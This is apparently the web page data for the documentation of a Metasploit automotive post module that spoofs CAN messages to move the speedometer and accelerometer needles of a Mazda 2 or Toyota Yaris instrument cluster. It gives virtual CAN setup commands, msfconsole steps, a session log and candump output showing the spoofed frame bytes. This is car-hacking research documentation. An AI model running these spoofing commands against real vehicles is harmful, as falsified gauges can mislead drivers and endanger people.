{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/hardware/automotive/mazda_ic_mover","result":{"data":{"moduleMetadataJson":{"id":"6c7de0e1-baec-5aaa-a408-9bb7fd15f2c3","name":"Mazda 2 Instrument Cluster Accelorometer Mover","fullname":"post/hardware/automotive/mazda_ic_mover","description":"This module moves the needle of the accelorometer and speedometer of the Mazda 2 instrument cluster","rank":300,"fields":{"detailsSlug":"/modules/details/post/hardware/automotive/mazda_ic_mover","documentationSlug":"/modules/documentation/post/hardware/automotive/mazda_ic_mover"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>mazda<em>ic</em>mover or Mazda 2 Instrument Cluster Accelorometer Mover sends CAN message to move the needle of the accelorometer and speedometer of the Mazda 2 instrument cluster. This works specifically for for Mazda 2 1.5 Skyactiv, Mazda Demio, Mazda 2 Demio, Scion iA, Toyota Yaris, Toyota Yaris R and Toyota Yaris iA.</p>\n<p>This <a href=\"https://twitter.com/rootconph/status/1171333590161879040\">research</a> was done by Jay Turla of ROOTCON's Car Hacking Village.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>Fire up virtual CAN bus:</p>\n<ol>\n<li><code class=\"language-text\">sudo modprobe can</code></li>\n<li><code class=\"language-text\">sudo modprobe vcan</code></li>\n<li><code class=\"language-text\">sudo ip link add dev vcan0 type vcan</code></li>\n<li><code class=\"language-text\">sudo ip link set up vcan0</code></li>\n</ol>\n<p>You could also use Craig Smith's <a href=\"https://github.com/zombieCraig/ICSim\">Virtual Instrument Cluster Simulator</a>.</p>\n<p>Launch msf:</p>\n<ol start=\"5\">\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li><code class=\"language-text\">use auxiliary/server/local_hwbridge</code></li>\n<li><code class=\"language-text\">set uripath testbus</code></li>\n<li><code class=\"language-text\">run</code></li>\n<li><code class=\"language-text\">use auxiliary/client/hwbridge/connect</code></li>\n<li><code class=\"language-text\">set targeturi testbus</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>CANBUS</strong>\nCAN Bus to perform scan on, defaults to connected bus</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>A successful spoofing of an instrument cluster on a target vehicle:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 auxiliary(client/hwbridge/connect) &gt; run\n[*] Running module against 127.0.0.1\n\n[*] Attempting to connect to 127.0.0.1...\n[*] Hardware bridge interface session 2 opened (127.0.0.1 -&gt; 127.0.0.1) at 2019-09-11 04:59:40 -0700\n[+] HWBridge session established\n[*] HW Specialty: {&quot;automotive&quot;=&gt;true}  Capabilities: {&quot;can&quot;=&gt;true, &quot;custom_methods&quot;=&gt;true}\n[!] NOTICE:  You are about to leave the matrix.  All actions performed on this hardware bridge\n[!]          could have real world consequences.  Use this module in a controlled testing\n[!]          environment and with equipment you are authorized to perform testing on.\n[*] Auxiliary module execution completed\nmsf5 auxiliary(client/hwbridge/connect) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                   Information  Connection\n  --  ----  ----                   -----------  ----------\n  2         hwbridge cmd/hardware  automotive   127.0.0.1 -&gt; 127.0.0.1 (127.0.0.1)\n\nmsf5 auxiliary(client/hwbridge/connect) &gt; sessions -i 2\n[*] Starting interaction with 2...\n\nhwbridge &gt; run post/hardware/automotive/mazda_ic_mover CANBUS=vcan0\n\n[*] Moving the accelorometer and speedometer...\nhwbridge &gt; run post/hardware/automotive/mazda_ic_mover CANBUS=vcan0\n\n[*] Moving the accelorometer and speedometer...\nhwbridge &gt; run post/hardware/automotive/mazda_ic_mover CANBUS=vcan0\n\n[*] Moving the accelorometer and speedometer...\nhwbridge &gt; run post/hardware/automotive/mazda_ic_mover CANBUS=vcan0\n\n[*] Moving the accelorometer and speedometer...\nhwbridge &gt; run post/hardware/automotive/mazda_ic_mover CANBUS=vcan0\n\n[*] Moving the accelorometer and speedometer...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>You can use candump to verify the CAN messages being sent:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">jjt@ubuntu:~/pentot/ICSim$ candump -c vcan0\n  vcan0  202   [8]  60 01 60 60 60 60 60 00\n  vcan0  202   [8]  60 01 60 60 60 60 60 00\n  vcan0  202   [8]  60 01 60 60 60 60 60 00\n  vcan0  202   [8]  60 01 60 60 60 60 60 00</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"6c7de0e1-baec-5aaa-a408-9bb7fd15f2c3"}}}